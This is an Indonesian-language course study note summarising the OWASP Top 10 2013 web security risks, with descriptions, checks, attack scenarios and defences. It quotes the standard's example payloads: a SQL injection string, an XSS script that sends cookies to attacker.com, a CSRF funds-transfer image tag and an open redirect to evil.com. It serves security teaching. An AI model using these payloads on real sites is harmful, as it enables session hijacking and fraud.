---
type: Note
cssclasses:
  - cornell-notes
---

_Back to_ [[IF5161 Keamanan Data dan Perangkat Lunak]]

> [!cornell] OWASP Top 10 2013
>
> > ## Questions/Cues
> >
> > - Apa dasar data OWASP Top 10 2013 dan bagaimana item diprioritaskan?
> > - Apa 10 risiko 2013 beserta rating Exploitability/Prevalence/Detectability/Impact-nya?
> > - Lima perubahan apa yang terjadi dari [[OWASP Top 10 2010]] ke 2013?
> > - Mengapa "Using Known Vulnerable Components" dijadikan kategori tersendiri?
> > - Contoh skenario serangan untuk Insecure Direct Object References, CSRF, dan Unvalidated Redirects and Forwards?
> >
> > ## Reference Points
> >
> > - IF5161 — OWASP Top 10 - 2013: The Ten Most Critical Web Application Security Risks
> > - IF5161 — GitHub OWASP/Top10 — `2013/OWASP Top 10 - 2013.pdf` (Halaman 6-21)
>
> > ### Konteks & Metodologi
> >
> > **OWASP Top 10 - 2013** menandai **ulang tahun ke-10** proyek (pertama rilis **2003**, update minor **2004** & **2007**). Versi **2010** dirombak untuk **memprioritaskan berdasarkan risiko, bukan sekadar prevalensi**; edisi 2013 mengikuti pendekatan yang sama. Tujuan utama: **_raising awareness_** — Top 10 dirujuk MITRE, PCI DSS, DISA, FTC, dll.
> >
> > **Basis data 2013:**
> >
> > - **8 dataset dari 7 firma** spesialis keamanan aplikasi — 4 perusahaan konsultan + 3 vendor *tool/SaaS* (1 statis, 1 dinamis, 1 keduanya).
> > - Mencakup **> 500.000 kerentanan** dari ratusan organisasi dan ribuan aplikasi.
> > - Item dipilih & diprioritaskan menurut **prevalence data** + **estimasi konsensus atas _exploitability, detectability, dan impact_**.
> >
> > **Skala risiko OWASP** (per risiko, dari perspektif *Application Specific*): tiap risiko diberi label pada empat sumbu — **Exploitability** (Easy / Average / Difficult), **Weakness Prevalence** (Widespread / Common / Uncommon), **Weakness Detectability** (Easy / Average / Difficult), **Technical Impact** (Severe / Moderate / Minor). Kombinasinya menghasilkan estimasi *likelihood* + *impact*. Nama risiko diambil dari **jenis serangan / kelemahan / dampak**, diselaraskan dengan terminologi umum.
> >
> > ### Daftar OWASP Top 10 2013
> >
> > | # | Kategori | Exploit / Prevalence / Detect / Impact | Deskripsi singkat (dari dokumen) |
> > |---|---|---|---|
> > | **A1** | Injection | Easy / Common / Average / Severe | Data tak tepercaya dikirim ke interpreter (SQL, OS, LDAP) sebagai bagian perintah/query |
> > | **A2** | Broken Authentication and Session Management | Average / Widespread / Average / Severe | Fungsi autentikasi & sesi salah implementasi → kompromi password/kunci/token/identitas |
> > | **A3** | Cross-Site Scripting (XSS) | Average / Very Widespread / Easy / Moderate | Data tak tepercaya dikirim ke browser tanpa validasi/escaping → skrip jalan di browser korban |
> > | **A4** | Insecure Direct Object References | Easy / Common / Easy / Moderate | Referensi ke objek internal (file, direktori, key DB) diekspos tanpa cek kontrol akses |
> > | **A5** | Security Misconfiguration | Easy / Common / Easy / Moderate | Konfigurasi tak aman di aplikasi/framework/server/DB/platform; default sering tak aman |
> > | **A6** | Sensitive Data Exposure | Difficult / Uncommon / Average / Severe | Data sensitif (kartu kredit, tax ID, kredensial) tak dilindungi enkripsi at rest / in transit |
> > | **A7** | Missing Function Level Access Control | Easy / Common / Average / Moderate | Cek hak akses level fungsi ada di UI tetapi tidak diulang di server → *forced access* |
> > | **A8** | Cross-Site Request Forgery (CSRF) | Average / Common / Easy / Moderate | Browser korban yang login dipaksa mengirim request HTTP palsu berisi cookie sesinya |
> > | **A9** | Using Components with Known Vulnerabilities | Average / Widespread / Difficult / Moderate | Library/framework/modul rentan berjalan dengan privilege penuh aplikasi |
> > | **A10** | Unvalidated Redirects and Forwards | Average / Uncommon / Easy / Moderate | Redirect/forward memakai data tak tepercaya untuk menentukan halaman tujuan |
> >
> > ```mermaid
> > flowchart LR
> >     subgraph S2010["2010"]
> >         O1["A1 Injection"]
> >         O2["A2 XSS"]
> >         O3["A3 Broken Auth &amp; Session Mgmt"]
> >         O4["A4 Insecure Direct Object References"]
> >         O5["A5 CSRF"]
> >         O6["A6 Security Misconfiguration"]
> >         O7["A7 Insecure Cryptographic Storage"]
> >         O8["A8 Failure to Restrict URL Access"]
> >         O9["A9 Insufficient Transport Layer Protection"]
> >         O10["A10 Unvalidated Redirects &amp; Forwards"]
> >     end
> >     subgraph S2013["2013"]
> >         N1["A1 Injection"]
> >         N2["A2 Broken Auth &amp; Session Mgmt"]
> >         N3["A3 XSS"]
> >         N4["A4 Insecure Direct Object References"]
> >         N5["A5 Security Misconfiguration"]
> >         N6["A6 Sensitive Data Exposure"]
> >         N7["A7 Missing Function Level Access Control"]
> >         N8["A8 CSRF"]
> >         N9["A9 Using Known Vulnerable Components"]
> >         N10["A10 Unvalidated Redirects &amp; Forwards"]
> >     end
> >     O1 --> N1
> >     O3 -- "naik" --> N2
> >     O2 -- "turun" --> N3
> >     O4 --> N4
> >     O6 --> N5
> >     O7 -- "merge" --> N6
> >     O9 -- "merge" --> N6
> >     O8 -- "diperluas" --> N7
> >     O5 -- "turun" --> N8
> >     O6 -. "dikeluarkan dari fine print" .-> N9
> >     O10 --> N10
> > ```
> >
> > ### A1 — Injection
> >
> > **Deskripsi.** *Injection flaw* (SQL, OS, LDAP) terjadi ketika data tak tepercaya dikirim ke interpreter sebagai bagian perintah/query. Sangat lazim di *legacy code* — sering di query SQL/LDAP/XPath/NoSQL, perintah OS, parser XML, header SMTP, argumen program. **Mudah ditemukan lewat review kode**, tetapi sering sulit lewat pengujian. Dampak: kehilangan/korupsi data, hilangnya *accountability*, penolakan akses, kadang **pengambilalihan host penuh**.
> >
> > **Am I Vulnerable?** Verifikasi bahwa setiap penggunaan interpreter **memisahkan data tak tepercaya dari perintah/query**. Untuk SQL: pakai *bind variable* di semua *prepared statement* & *stored procedure*, hindari *dynamic query*. Cek kode adalah cara cepat & akurat; *code analysis tool* membantu menelusuri *data flow*.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. `String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";`
> > 2. Kepercayaan buta pada framework — HQL: `Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");`
> >
> > Pada keduanya penyerang mengubah `id` menjadi `' or '1'='1` → `http://example.com/app/accountView?id=' or '1'='1`, membuat query mengembalikan **semua record** tabel `accounts`. Serangan lebih berbahaya bisa **mengubah data atau memanggil stored procedure**.
> >
> > **How Do I Prevent?**
> >
> > 1. **Safe API / parameterized interface** (hati-hati *stored procedure* yang tetap bisa injeksi "di balik layar").
> > 2. Bila tak ada API parameterized: **escape karakter khusus** dengan sintaks spesifik interpreter (OWASP **ESAPI** menyediakan rutin *escaping*).
> > 3. **Validasi input positif ("white list")** — bukan pertahanan lengkap; bila karakter khusus dibutuhkan, hanya opsi 1 & 2 yang membuatnya aman.
> >
> > ### A2 — Broken Authentication and Session Management
> >
> > **Deskripsi.** Fungsi autentikasi & manajemen sesi **sering dibangun kustom** dan sulit dibuat benar — cacat muncul di *logout, password management, timeout, remember me, secret question, account update*, dll. **Naik dari A3:2010 ke A2:2013** (diyakini karena area ini lebih diperhatikan, bukan karena benar-benar lebih prevalen). Dampak: sebagian/semua akun bisa diserang; akun *privileged* jadi target utama.
> >
> > **Am I Vulnerable?** Rentan bila:
> >
> > 1. Kredensial **tak dilindungi** hashing/enkripsi saat disimpan (lih. A6).
> > 2. Kredensial bisa **ditebak/ditimpa** lewat fungsi manajemen akun lemah (buat akun, ganti/pulihkan password, session ID lemah).
> > 3. **Session ID di URL** (URL rewriting).
> > 4. Session ID rentan **session fixation**.
> > 5. Session ID **tidak timeout**, atau sesi/token SSO tidak diinvalidasi saat logout.
> > 6. Session ID **tidak di-rotasi** setelah login sukses.
> > 7. Password/session ID dikirim lewat **koneksi tak terenkripsi** (lih. A6).
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi reservasi maskapai mendukung *URL rewriting*, menaruh session ID di URL: `http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii`. User mengirim tautan ini ke teman tanpa sadar juga memberikan session ID (dan kartu kreditnya).
> > 2. *Timeout* tak diset benar — user di komputer publik menutup tab tanpa "logout"; penyerang memakai browser sama satu jam kemudian, masih terautentikasi.
> > 3. *Insider* atau penyerang eksternal mengakses **database password** yang **tidak di-hash dengan benar** → semua password terekspos.
> >
> > **How Do I Prevent?** Sediakan bagi developer **satu set kontrol autentikasi & manajemen sesi yang kuat**, yang: (a) memenuhi persyaratan **OWASP ASVS V2 (Authentication) & V3 (Session Management)**; (b) punya antarmuka sederhana (contoh: ESAPI Authenticator & User API). Juga **hindari XSS** yang bisa dipakai mencuri session ID (lih. A3).
> >
> > ### A3 — Cross-Site Scripting (XSS)
> >
> > **Deskripsi.** **Cacat keamanan aplikasi web paling prevalen.** Terjadi ketika aplikasi menyertakan data pengguna dalam halaman yang dikirim ke browser **tanpa validasi/escaping yang benar**. Tiga tipe: **Stored, Reflected, DOM based**. Dampak: eksekusi skrip di browser korban → **pembajakan sesi, defacement, redirect, malware**, dsb. Deteksi cukup mudah lewat pengujian / *code analysis*.
> >
> > **Am I Vulnerable?** Rentan bila input pengguna **tidak di-escape / tidak divalidasi aman** sebelum dimasukkan ke halaman output → diperlakukan sebagai *active content*. Bila Ajax memperbarui halaman secara dinamis, apakah dipakai *safe JavaScript API*? Web 2.0 (Ajax) membuat XSS jauh lebih sulit dideteksi alat otomatis → butuh **kombinasi review kode manual + pentest**.
> >
> > **Contoh Skenario Serangan.** Aplikasi memakai data tak tepercaya tanpa validasi/escaping: `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";` Penyerang mengubah `CC` menjadi `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'` → session ID korban dikirim ke situs penyerang → sesi dibajak. (Penyerang juga bisa memakai XSS untuk mengalahkan pertahanan **CSRF** otomatis — lih. A8.)
> >
> > **How Do I Prevent?** Pisahkan data tak tepercaya dari konten browser aktif:
> >
> > 1. **Escape semua data tak tepercaya berdasarkan konteks HTML** (body, atribut, JavaScript, CSS, URL) — OWASP XSS Prevention Cheat Sheet.
> > 2. **Validasi input positif ("whitelist")** — validasi panjang, karakter, format, aturan bisnis.
> > 3. Untuk *rich content*: library **auto-sanitization** (OWASP **AntiSamy**, Java HTML Sanitizer).
> > 4. **Content Security Policy (CSP)** untuk pertahanan lintas-situs.
> >
> > ### A4 — Insecure Direct Object References
> >
> > **Deskripsi.** Terjadi ketika developer **mengekspos referensi ke objek implementasi internal** (file, direktori, key database) tanpa cek kontrol akses / proteksi lain. Aplikasi sering memakai **nama/key objek asli** saat membuat halaman dan tidak selalu memverifikasi otorisasi user terhadap objek target. Tester **mudah** memanipulasi nilai parameter untuk mendeteksinya; *code analysis* cepat menunjukkan apakah otorisasi diverifikasi.
> >
> > **Am I Vulnerable?** Untuk tiap objek yang bisa diakses user (nomor objek, nama file): (1) untuk referensi langsung ke sumber daya terbatas, apakah aplikasi **gagal memverifikasi** user berwenang atas sumber daya persis yang diminta? (2) bila referensi tidak langsung, apakah pemetaannya **gagal membatasi** nilai ke yang diizinkan untuk user saat ini?
> >
> > **Contoh Skenario Serangan.** Aplikasi memakai data tak terverifikasi di SQL: `String query = "SELECT * FROM accts WHERE account = ?"; pstmt.setString(1, request.getParameter("acct")); ResultSet results = pstmt.executeQuery();` Penyerang mengubah parameter `acct` di browser → `http://example.com/app/accountInfo?acct=notmyacct` → mengakses akun user mana pun.
> >
> > **How Do I Prevent?**
> >
> > 1. **Referensi objek tidak langsung per user/sesi** — mis. *drop-down* enam sumber daya yang diizinkan memakai angka 1–6; server memetakan kembali ke key database asli (OWASP **ESAPI** menyediakan *access reference map*).
> > 2. **Cek akses** — setiap penggunaan referensi objek langsung dari sumber tak tepercaya wajib melewati **cek kontrol akses**.
> >
> > ### A5 — Security Misconfiguration
> >
> > **Deskripsi.** Bisa terjadi di **level mana pun** stack — platform, web server, app server, database, framework, kode kustom. Developer & sysadmin harus bekerja sama memastikan seluruh stack dikonfigurasi benar. *Automated scanner* berguna mendeteksi *patch* hilang, miskonfigurasi, akun default, servis tak perlu. Dampak: akses tak berwenang ke data/fungsi; kadang **kompromi sistem penuh**.
> >
> > **Am I Vulnerable?**
> >
> > 1. Ada software **usang**? (OS, Web/App Server, DBMS, aplikasi, semua *code library* — lih. A9 baru).
> > 2. **Fitur tak perlu** aktif/terinstal (port, servis, halaman, akun, privilege)?
> > 3. **Akun & password default** masih aktif?
> > 4. *Error handling* membocorkan **stack trace** / pesan berlebihan?
> > 5. Setelan keamanan di framework (Struts, Spring, ASP.NET) & library **tidak diset ke nilai aman**?
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Konsol admin app server **terinstal otomatis & tidak dihapus**; akun default tak diganti → penyerang login dengan password default & mengambil alih.
> > 2. **Directory listing tidak dinonaktifkan** → penyerang meng-*list* direktori, mengunduh kelas Java terkompilasi, men-*decompile*, dan menemukan celah kontrol akses serius.
> > 3. Konfigurasi app server mengizinkan **stack trace** dikembalikan ke user → membocorkan celah yang mendasari.
> > 4. App server datang dengan **aplikasi contoh** yang tidak dihapus dari server produksi & punya celah keamanan terkenal.
> >
> > **How Do I Prevent?**
> >
> > 1. **Proses hardening yang dapat diulang & terotomasi**; dev/QA/prod dikonfigurasi identik (password berbeda).
> > 2. Proses **update & patch** tepat waktu ke tiap environment — termasuk semua *code library* (lih. A9 baru).
> > 3. **Arsitektur aplikasi kuat** dengan pemisahan komponen yang efektif & aman.
> > 4. **Scan & audit berkala** untuk mendeteksi miskonfigurasi / patch hilang di masa depan.
> >
> > ### A6 — Sensitive Data Exposure
> >
> > **Deskripsi.** **Kategori baru hasil merge** 2010-A7 (*Insecure Cryptographic Storage*) + 2010-A9 (*Insufficient Transport Layer Protection*) + risiko data sensitif di sisi browser. Cacat paling umum: **tidak mengenkripsi data sensitif** sama sekali. Bila kripto dipakai, sering lemah dalam *key generation/management*, algoritma, dan **teknik hashing password**. *"Penyerang biasanya tidak membobol kripto secara langsung"* — mereka mencuri kunci, MITM, atau mencuri *clear text* dari server/transit/browser.
> >
> > **Am I Vulnerable?** Tentukan dulu data mana yang cukup sensitif. Untuk semua data itu:
> >
> > 1. Ada yang disimpan **clear text jangka panjang**, termasuk *backup*?
> > 2. Ada yang dikirim **clear text**, internal atau eksternal? (Trafik internet sangat berbahaya.)
> > 3. Algoritma kripto **lama/lemah** dipakai?
> > 4. Kunci kripto lemah dibuat, atau **manajemen/rotasi kunci** hilang?
> > 5. *Security directive/header* browser hilang saat data sensitif dikirim ke/dari browser?
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi mengenkripsi nomor kartu kredit dengan **enkripsi database otomatis** → data **otomatis di-dekripsi** saat diambil → celah **SQL injection** mengembalikannya dalam *clear text*. Seharusnya dienkripsi dengan **public key**, hanya aplikasi back-end yang boleh dekripsi dengan private key.
> > 2. Situs **tidak memakai SSL** untuk semua halaman terautentikasi → penyerang memantau trafik (Wi-Fi terbuka), mencuri *session cookie*, membajak sesi.
> > 3. Database password memakai **hash tanpa salt** → celah *file upload* → penyerang mengambil file password → semua hash tanpa salt dibongkar *rainbow table*.
> >
> > **How Do I Prevent?** Minimal:
> >
> > 1. **Enkripsi semua data sensitif at rest & in transit** sesuai ancaman yang direncanakan.
> > 2. **Jangan simpan data sensitif yang tak perlu** — buang secepatnya. *"Data yang tidak kamu punya tidak bisa dicuri."*
> > 3. **Algoritma standar kuat + kunci kuat + manajemen kunci** benar; pertimbangkan modul kripto tervalidasi **FIPS 140**.
> > 4. Simpan password dengan algoritma **khusus proteksi password** — **bcrypt, PBKDF2, atau scrypt**.
> > 5. **Nonaktifkan autocomplete** di form data sensitif & **nonaktifkan caching** untuk halaman berdata sensitif.
> >
> > ### A7 — Missing Function Level Access Control
> >
> > **Deskripsi.** **Perluasan** dari 2010-A8 (*Failure to Restrict URL Access*) — kini mencakup **semua kontrol akses level fungsi**, bukan hanya via URL. Kebanyakan aplikasi memverifikasi hak akses level fungsi **sebelum menampilkan fungsi di UI**, tetapi lupa mengulang cek yang sama **di server** saat fungsi diakses → penyerang **memalsukan request** untuk mengakses fungsi tanpa otorisasi. Deteksi mudah; bagian tersulit: mengidentifikasi halaman/fungsi mana yang ada untuk diserang.
> >
> > **Am I Vulnerable?** Verifikasi setiap fungsi: (1) UI menampilkan navigasi ke fungsi tak berwenang? (2) Cek autentikasi/otorisasi **sisi server hilang**? (3) Cek server hanya bergantung pada info dari penyerang? Uji dengan *proxy*: telusuri aplikasi sebagai role *privileged*, lalu buka ulang halaman terbatas sebagai role rendah — jika respons server **sama**, kemungkinan rentan.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Penyerang **force browse** ke URL target: `http://example.com/app/getappInfo` dan `http://example.com/app/admin_getappInfo` (butuh hak admin). Jika user tak terautentikasi bisa akses salah satu → cacat; jika user non-admin terautentikasi bisa akses `admin_getappInfo` → cacat, dan bisa mengarah ke halaman admin lain yang tak terproteksi.
> > 2. Sebuah halaman menyediakan parameter `action` untuk menentukan fungsi yang dipanggil; role berbeda dibutuhkan per *action*. Jika role tidak ditegakkan → cacat.
> >
> > **How Do I Prevent?** Aplikasi harus punya **modul otorisasi yang konsisten & mudah dianalisis**, dipanggil dari **semua fungsi bisnis**:
> >
> > 1. Kelola *entitlement* agar mudah di-*update* & di-audit — **jangan _hard code_**.
> > 2. Mekanisme penegakan **deny all by default**, butuh *grant* eksplisit ke role tertentu untuk tiap fungsi.
> > 3. Bila fungsi bagian dari *workflow*, cek kondisi *state* sudah benar untuk mengizinkan akses.
> >
> > *Catatan:* "presentation layer access control" (menyembunyikan link/tombol) **bukan proteksi** — cek wajib juga di *controller* / logika bisnis.
> >
> > ### A8 — Cross-Site Request Forgery (CSRF)
> >
> > **Deskripsi.** Serangan CSRF **memaksa browser korban yang sudah login** mengirim **request HTTP palsu** — termasuk *session cookie* dan info autentikasi lain yang otomatis disertakan — ke aplikasi web rentan. Aplikasi mengira request itu **sah dari korban**. **Turun dari 2010-A5 ke 2013-A8** karena banyak framework kini menyertakan pertahanan CSRF sehingga jumlah kerentanan nyata berkurang signifikan. Deteksi cukup mudah lewat pentest / *code analysis*.
> >
> > **Am I Vulnerable?** Cek apakah link & form **tidak punya token CSRF tak terprediksi**. Session cookie, IP sumber, dan info lain yang otomatis dikirim browser **tidak memberi pertahanan** apa pun (juga disertakan di request palsu). Fokus pada link/form yang **mengubah _state_**; cek juga transaksi multi-langkah (tidak imun secara inheren).
> >
> > **Contoh Skenario Serangan.** Aplikasi mengizinkan request pengubah *state* tanpa unsur rahasia: `http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243`. Penyerang menyusun request transfer ke rekeningnya lalu menanamnya di `<img>`/iframe di situs yang ia kendalikan: `<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#" width="0" height="0" />`. Jika korban mengunjungi situs penyerang **sambil masih login** ke example.com, request palsu otomatis menyertakan info sesi korban.
> >
> > **How Do I Prevent?** Sertakan **token tak terprediksi di setiap request HTTP** (minimal unik per sesi user):
> >
> > 1. **Utama:** token di *hidden field* → terkirim di *body*, bukan URL.
> > 2. Token bisa juga di URL / parameter URL — tetapi lebih berisiko terekspos.
> > 3. **Re-autentikasi** atau bukti "user sungguhan" (CAPTCHA) untuk operasi paling sensitif.
> >
> > OWASP **CSRFGuard** menyisipkan token otomatis di aplikasi Java EE/.NET/PHP; ESAPI juga menyediakan metode anti-CSRF.
> >
> > ### A9 — Using Components with Known Vulnerabilities
> >
> > **Deskripsi.** **Kategori baru 2013** — sebelumnya "terkubur di *fine print*" 2010-A6 Security Misconfiguration; dikeluarkan karena **pertumbuhan pengembangan berbasis komponen** meningkatkan risiko secara signifikan. Komponen (library, framework, modul) **hampir selalu berjalan dengan privilege penuh** aplikasi → celah bisa menyebabkan **kehilangan data serius / pengambilalihan server**. *"Praktis setiap aplikasi punya masalah ini"* karena tim jarang memastikan komponennya mutakhir, bahkan sering tak tahu semua komponen yang dipakai.
> >
> > **Am I Vulnerable?** Sulit dipastikan: laporan kerentanan tak selalu menyebut versi persis yang rentan secara terstruktur; tak semua library punya penomoran versi jelas; tak semua kerentanan dilaporkan ke *clearinghouse* (walau CVE & NVD makin mudah dicari). Perlu **menelusuri database + mengikuti milis proyek/keamanan**, lalu mengevaluasi apakah kode benar-benar memakai bagian komponen yang rentan.
> >
> > **Contoh Skenario Serangan.** Dua komponen rentan yang **diunduh 22 juta kali pada 2011**:
> >
> > - **Apache CXF Authentication Bypass** — dengan tidak menyertakan *identity token*, penyerang bisa memanggil web service apa pun dengan izin penuh.
> > - **Spring Remote Code Execution** — penyalahgunaan implementasi *Expression Language* di Spring → eksekusi kode arbitrer → pengambilalihan server.
> >
> > Setiap aplikasi yang memakai kedua library ini rentan karena keduanya **dapat diakses langsung** oleh pengguna aplikasi.
> >
> > **How Do I Prevent?** Proyek software harus punya proses untuk:
> >
> > 1. **Identifikasi semua komponen & versi** yang dipakai, termasuk semua dependensi (mis. *versions plugin*).
> > 2. **Pantau keamanan komponen** di database publik, milis proyek & milis keamanan; jaga tetap mutakhir.
> > 3. **Kebijakan keamanan** yang mengatur pemakaian komponen (praktik pengembangan tertentu, lolos uji keamanan, lisensi yang dapat diterima).
> > 4. Bila perlu, tambahkan **_security wrapper_** di sekitar komponen untuk menonaktifkan fungsi tak terpakai / mengamankan aspek lemahnya.
> >
> > ### A10 — Unvalidated Redirects and Forwards
> >
> > **Deskripsi.** Aplikasi web sering **me-*redirect* & *forward*** pengguna ke halaman/situs lain dan memakai **data tak tepercaya** untuk menentukan tujuan. Tanpa validasi, penyerang bisa **mengarahkan korban ke situs phishing/malware**, atau memakai *forward* untuk mengakses halaman tak berwenang. Mendeteksi *redirect* tak tervalidasi mudah (cari redirect yang bisa di-set URL penuh); *forward* lebih sulit karena menargetkan halaman internal.
> >
> > **Am I Vulnerable?** (1) Review kode untuk semua penggunaan *redirect*/*forward* (disebut *transfer* di .NET) — apakah URL tujuan berasal dari parameter & **tidak divalidasi terhadap _whitelist_**? (2) *Spider* situs untuk melihat *redirect* (HTTP 300-307, biasanya 302); periksa parameter sebelum *redirect*. (3) Bila kode tak tersedia, uji semua parameter yang tampak seperti URL tujuan.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi punya halaman `redirect.jsp` dengan satu parameter `url`. Penyerang menyusun URL jahat yang mengarahkan pengguna ke situs jahat (phishing + malware): `http://www.example.com/redirect.jsp?url=evil.com`.
> > 2. Aplikasi memakai *forward* untuk merutekan request; sebagian halaman memakai parameter tujuan setelah transaksi sukses. Penyerang menyusun URL yang **lolos cek kontrol akses** lalu di-*forward* ke fungsi administratif yang tak berwenang: `http://www.example.com/boring.jsp?fwd=admin.jsp`.
> >
> > **How Do I Prevent?**
> >
> > 1. **Hindari** *redirect* & *forward* sama sekali.
> > 2. Bila dipakai, **jangan libatkan parameter pengguna** dalam menghitung tujuan.
> > 3. Bila parameter tujuan tak terhindarkan, **validasi nilainya** dan pastikan berwenang untuk user — disarankan berupa **nilai pemetaan**, bukan URL asli; server menerjemahkan pemetaan ke URL target (ESAPI bisa meng-*override* `sendRedirect()`).
> >
> > ### Perubahan dari Edisi 2010
> >
> > 1. **Broken Authentication and Session Management** naik: **A3:2010 ↔ A2:2013** (bertukar tempat dengan XSS yang turun ke A3).
> > 2. **CSRF** turun: **A5:2010 → A8:2013** — framework sudah banyak menambahkan pertahanan CSRF selama 6 tahun.
> > 3. **Failure to Restrict URL Access** (A8:2010) diperluas menjadi **A7:2013 Missing Function Level Access Control** — mencakup semua cara menentukan fungsi, bukan hanya URL.
> > 4. **Merge:** A7:2010 (*Insecure Cryptographic Storage*) **+** A9:2010 (*Insufficient Transport Layer Protection*) **+** risiko data sensitif sisi browser → **A6:2013 Sensitive Data Exposure**.
> > 5. **Kategori baru:** **A9:2013 Using Known Vulnerable Components** — dikeluarkan dari *fine print* A6:2010 Security Misconfiguration.

> [!cornell] #### Summary
>
> **OWASP Top 10 - 2013** (ulang tahun ke-10 proyek) disusun dari **8 dataset / 7 firma** mencakup **> 500.000 kerentanan**, dengan tiap risiko diberi rating **Exploitability / Prevalence / Detectability / Impact**. **Injection** tetap **#1**. Perubahan besar dari [[OWASP Top 10 2010]]: **Broken Authentication and Session Management** naik ke **#2** (menukar posisi dengan **XSS**), **CSRF** turun ke **#8** karena pertahanan framework, **Failure to Restrict URL Access** diperluas jadi **Missing Function Level Access Control**, **Insecure Cryptographic Storage** + **Insufficient Transport Layer Protection** melebur menjadi **Sensitive Data Exposure**, dan lahir kategori baru **A9 Using Components with Known Vulnerabilities**. Edisi ini menjadi basis langsung bagi [[OWASP Top 10 2017]] — yang menggabungkan *Insecure Direct Object References* + *Missing Function Level Access Control* menjadi *Broken Access Control* dan memensiunkan CSRF serta *Unvalidated Redirects and Forwards*.

> [!ad-libitum]- Additional Information
>
> #### Nasib kategori 2013 di edisi berikutnya (konteks tambahan, bukan dari dokumen 2013)
>
> | 2013 | 2017 |
> |---|---|
> | A4 Insecure Direct Object References | Digabung → A5:2017 Broken Access Control |
> | A7 Missing Function Level Access Control | Digabung → A5:2017 Broken Access Control |
> | A8 CSRF | Dipensiunkan (hanya 5% aplikasi) |
> | A10 Unvalidated Redirects and Forwards | Dipensiunkan (kalah dari XXE) |
> | A6 Sensitive Data Exposure | Tetap (lalu 2021 → Cryptographic Failures) |
> | A9 Using Components with Known Vulnerabilities | Tetap (lalu 2021 → Vulnerable and Outdated Components) |
>
> #### Format halaman risiko 2013
>
> Tiap risiko memakai kartu **Threat Agents → Attack Vectors → Security Weakness → Technical Impacts → Business Impacts**, diikuti **_Am I Vulnerable?_ → _How Do I Prevent This?_ → _Example Attack Scenarios_ → References**. Banyak referensi menunjuk **OWASP ESAPI** (Enterprise Security API) — library kontrol keamanan yang populer pada era itu, kini sebagian besar digantikan panduan *Cheat Sheet* & framework modern.
>
> #### Proyek Eksplorasi Mandiri
>
> 1. Petakan tiap risiko 2013 ke CWE (CWE-89, CWE-79, CWE-639, CWE-352, CWE-601, dll.) dan bandingkan dengan pemetaan di [[OWASP Top 10 2021]].
> 2. Ambil aplikasi lama (mis. DVWA) dan reproduksi skenario IDOR (A4) & CSRF (A8); amati mengapa framework modern menyulitkan A8.
> 3. Telusuri sejarah CVE Apache CXF & Spring EL RCE yang dikutip dokumen — hubungkan ke A9.
>
> #### Bacaan Lanjutan
>
> - OWASP Top 10 - 2013 (PDF resmi) — GitHub `OWASP/Top10/2013/`.
> - OWASP ASVS (V2, V3, V4, V7, V9, V10, V12), OWASP Cheat Sheet Series, OWASP Testing Guide.
> - OWASP Dependency Check, OWASP CSRFGuard, OWASP AntiSamy.
